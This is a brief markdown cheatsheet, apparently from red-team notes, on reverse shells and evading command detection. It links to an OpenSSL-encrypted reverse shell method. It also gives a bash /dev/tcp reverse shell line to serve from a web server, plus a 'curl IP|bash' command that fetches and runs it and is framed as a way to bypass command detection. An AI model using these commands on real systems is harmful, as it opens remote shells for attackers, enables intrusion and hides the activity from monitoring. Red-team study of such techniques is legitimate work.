## Network
- [OpenSSL encryption](https://github.com/Jayway007/Offense-and-Deffense/blob/main/Offense/Red-Team/Execution/Reverse-Shell/Cheatsheet.md#openssl)

## Host
- CMD detect bypass
  Set up a web server and write content in :
  ```
  bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
  ```
  Then execute cmd below to bypass cmd detection:
  ```
  curl 47.xxx.xxx.72|bash
  ```
- 
